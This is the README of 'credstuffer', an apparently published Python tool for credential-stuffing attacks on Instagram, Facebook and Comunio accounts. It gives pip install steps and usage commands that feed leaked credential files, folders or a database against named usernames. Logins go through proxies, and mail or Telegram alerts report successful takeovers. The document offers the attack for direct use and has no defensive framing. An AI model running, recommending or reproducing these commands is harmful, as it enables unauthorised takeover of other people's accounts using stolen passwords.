# credstuffer
[![Build Status](https://travis-ci.org/bierschi/credstuffer.png?branch=master)](https://travis-ci.org/bierschi/credstuffer) [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)

**Features** of [credstuffer](https://github.com/bierschi/credstuffer):
- Stuffing social media accounts like comunio, instagram, facebook
- Provide easily credentials from directories, files or from a database connection
- Get Mail or Telegram notifications in success case
- Login requests are only made over proxies

## Installation

install [credstuffer](https://pypi.org/project/credstuffer/) with pip
<pre><code>
pip3 install credstuffer
</code></pre>

or from source
<pre><code>
sudo python3 setup.py install
</code></pre>


## Usage and Examples

Print the available arguments for credstuffer
<pre><code>
credstuffer --help
</code></pre>

Use it with a credential file of your choice
<pre><code>
credstuffer instagram --usernames "John, Jane" file --path /home/john/credentials.txt
</code></pre>

Provide a directory including multiple credential files
<pre><code>
credstuffer instagram --usernames "John, Jane" file --dir /home/john/credential_collection/
</code></pre>

Or fetch credential data from a database connection
<pre><code>
credstuffer instagram --usernames "John, Jane" database --host 192.168.1.2 --port 5432 --user john --password test1234 --dbname postgres --schemas a --tables abc
</code></pre>

Pass Mail Server params to get a notification in success case
<pre><code>
credstuffer instagram --usernames "John, Jane" --Nsmtp smtp.web.de --Nport 587 --Nsender sender@web.de --Nreceiver receiver@web.de --Npassword password file --dir /home/john/credential_collection/
</code></pre>

## Logs

logs can be found in `/var/log/credstuffer`

## Troubleshooting
add your current user to group `syslog`, this allows the application/scripts to create a folder in
`/var/log`. Replace `<user>` with your current user
<pre><code>
sudo adduser &lt;user&gt; syslog
</code></pre>
to apply this change, log out and log in again and check with the terminal command `groups`

## Changelog
All changes and versioning information can be found in the [CHANGELOG](https://github.com/bierschi/credstuffer/blob/master/CHANGELOG.rst)

## License
Copyright (c) 2019 Bierschneider Christian. See [LICENSE](https://github.com/bierschi/credstuffer/blob/master/LICENSE)
for details


